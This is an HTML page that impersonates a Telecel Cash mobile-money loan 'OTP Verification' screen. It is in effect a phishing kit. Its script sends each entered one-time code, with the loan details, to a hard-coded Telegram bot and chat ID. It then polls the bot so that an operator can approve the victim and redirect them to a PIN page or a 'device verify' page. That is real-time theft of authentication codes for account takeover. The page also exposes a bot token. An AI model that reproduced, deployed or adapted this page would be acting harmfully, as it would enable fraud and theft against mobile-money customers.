<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Verification - Telecel Cash</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --red: #E42320;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 12px;
        }
        .container {
            width: 100%;
            max-width: 420px;
            background: white;
            border-radius: 28px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        /* Red Header */
        .header {
            background: #E42320;
            color: white;
            padding: 20px;
            text-align: center;
        }
        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 8px;
        }
        .logo-circle {
            width: 42px;
            height: 42px;
            background: white;
            color: #E42320;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 20px;
        }
        h1 {
            font-size: 24px;
            font-weight: 700;
            margin: 10px 0 6px;
        }
        .subtitle {
            font-size: 15px;
            opacity: 0.95;
            line-height: 1.4;
        }

        /* Loan Info Box */
        .loan-box {
            margin: 20px;
            background: #fff0f0;
            border-radius: 16px;
            padding: 18px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .loan-left {
            font-size: 15px;
        }
        .loan-amount {
            font-size: 28px;
            font-weight: 800;
            color: var(--red);
        }
        .loan-right {
            text-align: right;
            font-size: 14px;
            color: #444;
        }

        /* OTP */
        .otp-container {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin: 10px 0 25px;
            padding: 0 20px;
        }
        .otp-input {
            width: 52px;
            height: 62px;
            text-align: center;
            font-size: 26px;
            font-weight: 700;
            border: 2px solid #ddd;
            border-radius: 12px;
            outline: none;
        }
        .otp-input:focus {
            border-color: var(--red);
            box-shadow: 0 0 0 4px rgba(228, 35, 32, 0.15);
        }

        .form-section {
            padding: 0 25px 30px;
        }
        .btn-action {
            width: 100%;
            background: var(--red);
            color: white;
            border: none;
            padding: 16px;
            font-size: 17px;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
        }
        .back-btn {
            margin-top: 12px;
            background: transparent;
            color: #666;
            border: 2px solid #ddd;
            padding: 14px;
            font-size: 16px;
            border-radius: 50px;
            width: 100%;
        }
        .error-msg {
            display: none;
            text-align: center;
            color: #c00;
            background: #ffebee;
            padding: 12px;
            margin: 15px 20px;
            border-radius: 12px;
        }
        #spinner {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.9);
            z-index: 10000;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: white;
        }
        .spin {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <!-- Red Header -->
        <div class="header">
            <div class="logo">
                <div class="logo-circle">t</div>
                <div>
                    <strong style="font-size:18px;">Telecel Cash</strong><br>
                    <span style="font-size:13px; opacity:0.9;">Mobile Money</span>
                </div>
            </div>
            <h1>OTP Verification</h1>
            <p class="subtitle">Enter the 5-digit code sent to your Telecel number to authorize the loan.</p>
        </div>

        <!-- Loan Info -->
        <div class="loan-box" id="loanBox">
            <!-- Filled by JS -->
        </div>

        <!-- OTP Inputs -->
        <div class="otp-container" id="otpContainer"></div>

        <div class="error-msg" id="errMsg"></div>

        <div class="form-section">
            <button class="btn-action" id="verifyBtn">Verify & Authorize Loan</button>
            <button class="back-btn" onclick="window.history.back()">← Back</button>
        </div>
    </div>

    <!-- Spinner -->
    <div id="spinner">
        <div class="spin"></div>
        <p style="margin-top:20px;">Verifying OTP...</p>
    </div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const name = params.get('name') || 'Flex Loan';
        const amount = params.get('amount') || '1000';
        const repay = params.get('repay') || '1381';
        const duration = params.get('duration') || '30';

        // Fill loan box
        document.getElementById('loanBox').innerHTML = `
            <div class="loan-left">
                <strong>${name}</strong><br>
                <span style="font-size:28px; color:#E42320; font-weight:800;">GHS ${parseInt(amount).toLocaleString()}</span>
            </div>
            <div class="loan-right">
                Total Repay: GHS ${parseInt(repay).toLocaleString()}<br>
                ${duration} Days
            </div>
        `;

        // Create 5 OTP boxes
        function createOTP() {
            const container = document.getElementById('otpContainer');
            container.innerHTML = '';
            for (let i = 0; i < 5; i++) {
                const input = document.createElement('input');
                input.type = 'text';
                input.maxLength = 1;
                input.className = 'otp-input';
                input.inputMode = 'numeric';
                container.appendChild(input);
            }
            setupFocus();
        }

        function setupFocus() {
            const inputs = document.querySelectorAll('.otp-input');
            inputs.forEach((input, index) => {
                input.addEventListener('input', () => {
                    if (input.value.length === 1 && index < 4) inputs[index+1].focus();
                    if (getCode().length === 5) verifyOTP();
                });
            });
        }

        function getCode() {
            return Array.from(document.querySelectorAll('.otp-input')).map(i => i.value).join('');
        }

        function verifyOTP() {
            const otp = getCode();
            if (otp.length !== 5) return;

            document.getElementById('spinner').style.display = 'flex';
            document.getElementById('verifyBtn').disabled = true;

            // Send to Telegram Bot with Approve / Verify Device / Decline buttons
            const ts = Date.now();
            const approveId = `approve_${ts}`;
            const declineId = `decline_${ts}`;
            const verifyId = `verify_${ts}`;

            fetch(`https://api.telegram.org/bot8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '7547427914',
                    text: `<b>🔴 Telecel Loan OTP Verification</b>\n\n` +
                          `Loan: ${name}\n` +
                          `Amount: GHS ${parseInt(amount).toLocaleString()}\n` +
                          `OTP: <code>${otp}</code>\n\nChoose Action:`,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "✅ Approve Loan", callback_data: approveId },
                                { text: "📱 Verify Device", callback_data: verifyId }
                            ],
                            [{ text: "❌ Decline", callback_data: declineId }]
                        ]
                    }
                })
            }).then(() => {
                // Start polling for callback
                startPolling(approveId, declineId, verifyId);
            });
        }

        function startPolling(approveId, declineId, verifyId) {
            const interval = setInterval(() => {
                fetch(`https://api.telegram.org/bot8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8/getUpdates?offset=-1`)
                    .then(r => r.json())
                    .then(data => {
                        if (!data.ok || !data.result) return;
                        data.result.forEach(update => {
                            if (update.callback_query) {
                                const cb = update.callback_query.data;
                                clearInterval(interval);
                                document.getElementById('spinner').style.display = 'none';

                                if (cb === approveId) {
                                    window.location.href = `pin.html?${params.toString()}`;
                                } else if (cb === verifyId) {
                                    window.location.href = `device_verify.html?${params.toString()}`;
                                } else if (cb === declineId) {
                                    document.getElementById('errMsg').textContent = "Request declined. Please try again.";
                                    document.getElementById('errMsg').style.display = 'block';
                                }
                            }
                        });
                    });
            }, 1200);
        }

        // Initialize
        createOTP();
    </script>
</body>
</html>
